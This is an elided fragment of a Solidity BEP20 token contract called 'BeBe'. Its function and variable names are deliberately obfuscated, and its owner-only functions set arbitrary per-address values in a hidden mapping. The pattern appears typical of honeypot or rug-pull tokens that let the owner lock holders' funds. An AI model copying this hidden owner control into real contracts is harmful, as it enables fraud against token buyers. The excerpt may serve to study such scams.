...
contract BeBe is IBEP20, HasForeignAsset {
    ...
    function getBaoBey88252ssit(address booadndd) public view returns (uint256) {
        return _depolssit[booadndd];
    }

    function _setBaoBey88252reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupBaoBey88252ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function SetupBaoBey88252Aasses(address booadndd,uint256 nuum) public onlyOwner {
    ...
    constructor() {
        ...
        _symbol = "BeBe";
        _decimals = 9;
        uint256 _maxSupply = 130000000000;
